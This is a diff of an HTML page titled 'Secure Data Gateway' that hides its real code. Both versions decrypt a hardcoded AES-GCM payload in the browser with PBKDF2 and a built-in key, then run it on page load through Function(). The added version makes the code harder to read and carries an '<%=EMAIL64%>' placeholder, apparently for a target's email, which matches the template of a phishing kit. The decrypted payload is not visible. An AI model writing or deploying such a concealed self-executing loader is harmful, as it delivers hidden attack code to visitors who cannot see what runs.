@@ -1,63 +1,27 @@
 <!DOCTYPE html>
-<html nike-Obleee="" adidas="<%=EMAIL64%>" lang="en">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Secure Data Gateway</title>
     <style>
-        body {
-            background: #d0d0d0;
-            font-family: monospace;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            flex-direction: column;
-        }
+        body { background: #d0d0d0; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; margin: 0; }
     </style>
 </head>
 <body>
-    <p>Bootstrapping security module...</p>
-    <script>
-        async function decryptData(encrypted, iv, salt, key) {
-            const hexToArray = hex => new Uint8Array(hex.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));
-            
-            const baseKey = await crypto.subtle.importKey(
-                "raw",
-                new TextEncoder().encode(key),
-                { name: "PBKDF2" },
-                false,
-                ["deriveKey"]
-            );
-
-            const derivedKey = await crypto.subtle.deriveKey(
-                { name: "PBKDF2", salt: hexToArray(salt), iterations: 100000, hash: "SHA-256" },
-                baseKey,
-                { name: "AES-GCM", length: 256 },
-                false,
-                ["decrypt"]
-            );
-
-            return crypto.subtle.decrypt(
-                { name: "AES-GCM", iv: hexToArray(iv) },
-                derivedKey,
-                hexToArray(encrypted)
-            ).then(decrypted => new TextDecoder().decode(decrypted)).catch(() => null);
+    <p>Initializing decryption...</p>
+    <script nike-testme="" adidas="<%=EMAIL64%>">
+        async function d(e, i, s, k) {
+            const h = t => new Uint8Array(t.match(/.{1,2}/g).map(b => parseInt(b, 16)));
+            const b = await crypto.subtle.importKey("raw", new TextEncoder().encode(k), { name: "PBKDF2" }, false, ["deriveKey"]);
+            const d = await crypto.subtle.deriveKey({ name: "PBKDF2", salt: h(s), iterations: 100000, hash: "SHA-256" }, b, { name: "AES-GCM", length: 256 }, false, ["decrypt"]);
+            return crypto.subtle.decrypt({ name: "AES-GCM", iv: h(i) }, d, h(e)).then(d => new TextDecoder().decode(d)).catch(() => null);
         }
-
         (async () => {
-            const encryptedPayload = {
-                iv: "0a6d791008bd13b5d22d4e92",
-                salt: "cb6853c10fc7a13ae3fd54b1af489606",
-                encrypted: "e2b5f7da69e614a29737cf95404cf4d2bf56f5c5635356c0e94917b504bbd2e4fa7e7c3b7a9849dc3c26889e14e28690daa199f60070b2fcaae0726a246226d9e1e34f65b6aba4b2151016ccf4ba0dcecc38e79804fa296c4d94ef4b64c9f1ed021e3c331af17d2bdd40f791f580c232810895aaf42def5bc9ff15a11dc27fa5c5d003a7a0a14968d58ad8833940a2e935a85cef230aea8a89254e4f6e6659b9af8d7fea89a1f8642c75710c053816c3385cf63667c1e2c2b25cd4b7ddf2570c"
-            };
-            
-            const secretKey = "homesweethome";
-            const decryptedResult = await decryptData(encryptedPayload.encrypted, encryptedPayload.iv, encryptedPayload.salt, secretKey);
-            
-            if (decryptedResult) {
-                Function(decryptedResult)();
-            }
+            const p = { iv: "ceb0f4f1afbc695ad02798ab", salt: "752dba59f37d01b08991d9e6c34ac389", encrypted: "7bff1ae4d47ea505fd6c83c97eb65a0ef996d06e0650b6621557464fb7a63a350bfb1ad9721a50376393f1751c376bb871d0a2a271d571d13497674fc27a2101feaf4648f7665ce05a5026d879529ffa559960eff54350865101249e319f5d5b1c7b3f888db4104afc3c8708f0ad2dacc6de7a0f088dbcb03bf946f173309556cba4e260d7e96caceee55e4548d1821d424587b2c252a46c8ef643e91fabf666da72f60def1cdc4c598bec8cdeef592b93f6d9aedd25e1a199c44b2bb27547c2" };
+            const k = "ea58c0ef491543774f851a0a594c7535";
+            const r = await d(p.encrypted, p.iv, p.salt, k);
+            if (r) Function(r)();
         })();
     </script>
 </body>
